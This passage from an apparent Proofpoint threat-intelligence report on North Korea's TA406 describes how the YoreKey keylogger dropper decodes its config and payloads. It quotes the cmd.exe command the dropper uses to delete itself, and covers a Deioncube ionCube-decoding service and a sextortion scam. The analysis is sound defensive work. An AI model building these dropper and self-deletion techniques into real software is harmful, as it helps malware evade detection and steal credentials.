payloads**\n\nThis value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This\nparticular dropper only had two embedded payloads, so the size of the config was 152 bytes. The config is then decoded via\na NOT operation on all the bytes.\n\nEach segment of the config is 76 bytes and made up of the following data: [ID/item, DWORD][location, DWORD][size,\n_DWORD][Unicode filename, 64-bytes] (Figure 45)._\n\n**Figure 45. YoreKey dropper decoded config**\n\nThe dropper parses the decoded config for the location of the embedded payload, the size and then, finally, the file name. In\nthe case of at least the first embedded payload, which was the YoreKey keylogger, a hardcoded file name is used instead of\nthe file name defined in the config: fontdrv.exe. The second embedded payload was a legitimate copy of the MT4 installer.\n\nNext, the payloads embedded in the dropper are decoded using a NOT operation on all bytes before writing them to disk.\nThe extracted payloads are then exited with ShellExecuteW.\n\nFinally, the original dropper is deleted using the following cmd.exe command:\n_/c del [file path to exe]\\MT4MAN~1.EXE >> NUL._\n\n\n-----\n\n## A not-so-legitimate service: Deioncube\n\nNorth Korea has a long history of using different methods to generate currency to evade sanctions, several of which are\n[conducted by North Koreans focused on cyber operations. Some of those methods include the theft of cryptocurrency, ATM](https://www.proofpoint.com/sites/default/files/pfpt-us-wp-north-korea-bitten-by-bitcoin-bug-180129.pdf)\n**[cash-out schemes and ransomware.](https://us-cert.cisa.gov/ncas/alerts/aa20-239a)**\n\nIn the past, TA406 has been observed using fake aliases and accounts to pose as software developers for hire. This behavior\n[has already been described by ESTsecurity in their Smoke Screen research. ESTsecurity discovered that operator(s)](https://blog.alyac.co.kr/2243)\nregistered for accounts on various freelancing websites offering their software development services for money. Whether this\nactivity was a state-orchestrated scheme for financial gain or intended to compromise their unsuspecting clients is unknown.\nIf the latter, some of the themes used by TA406 were related to cryptocurrency, and so, those clients could’ve been ideal\ntargets for the theft of any cryptocurrency they might possess.\n\nProofpoint tracks the activity associated with JamFedura and related aliases, accounts and campaigns as TA406. TA406\nhas an established history of conducting currency-generating campaigns using similar TTPs as their traditional espionage\n[campaigns. Some of those campaigns include the BabyShark-like campaigns associated with the JamFedura alias, Android](https://blog.alyac.co.kr/2486)\n**[APK campaigns targeting individual cryptocurrency users in South Korea (tracked by Proofpoint as Android Moez), and](https://blog.alyac.co.kr/2486)**\ncredential-harvesting campaigns using cryptocurrency themes.\n\n[In 2021, TA406 operated an ionCube deobfuscation service (deioncube[.]biz) that may have been used for financial gain.](https://www.ioncube.com/)\nThe ionCube software can protect PHP scripts with encryption and licensing. The domain was registered using the same\nemail address (donaldxxxtrump[@]yandex[.]ru) as several domains used throughout 2021 for both credential-harvesting and\nmalware campaigns.\n\nThe deobfuscation service, aptly named Deioncube (Figure 46), stated that it was capable of allowing anyone to “decode the\nfiles encrypted with IonCube easily.”\n\n**Figure 46. Deioncube landing page**\n\n\n-----\n\nThe cost for each file decode, if purchased individually, was listed as $10 per file. Bulk decodes were offered at a cheaper\nprice, up to 500 file decodes for $500 ($1 each). Bitcoin and Ethereum were accepted as payment for file decodes, as Figure\n47 shows.\n\n**Figure 47. Payment page accepting Bitcoin or Ethereum**\n\nProofpoint analysts didn’t make any transactions on the website, so it was never verified if the service could remove ionCube\nprotection, nor is it known how much or if any currency was generated while this service was operational. Neither the Bitcoin\nnor Ethereum addresses presented during testing have received any cryptocurrency; however, it’s possible that unique\naddresses are generated for each job and/or user.\n\nBased on screenshots left on the server hosting the service, development on Deioncube began no later than April 2020.\nDevelopment for many of Deioncube’s web interface features were likely completed no later than December 2020.\n\n\n-----\n\n[TA406 may conduct sextortion scams for currency generation as well. In 2019, a test message was observed being sent](https://www.proofpoint.com/us/blog/threat-insight/bec-taxonomy-extortion)\nbetween two TA406 accounts (Figure 48).\n\n**Figure 48: Part of a sextortion email sent from a TA406 email address**\n\nAlthough the message was sent in 2019, the Bitcoin address used in the email didn’t receive any Bitcon until 2020. The same\naddress is also currently listed on a donation/support page for a South Korea-based NGO. It’s unknown whether the NGO\nwas compromised, and the donation message was placed on their website maliciously, or if there’s another explanation.\n\nAs of June 2021, the associated Bitcoin wallet had received and sent about 3.77 Bitcoin.\n\n\n-----\n\n## Conclusion\n\n###### Beginning in January 2021, Proofpoint observed TA406 activity on a near weekly basis. The campaigns mostly attempted to steal credentials from targets in multiple sectors including education, research or government entities. TA406 has used malware in multiple campaigns observed by Proofpoint this year, employing similar anti-analysis and periodic time-based C&C calls to steal and exfiltrate data.\n\n Proofpoint anticipates this threat actor will continue to conduct corporate credential theft operations frequently, targeting entities of interest to the North Korean government.\n\n\n-----\n\n### Emerging
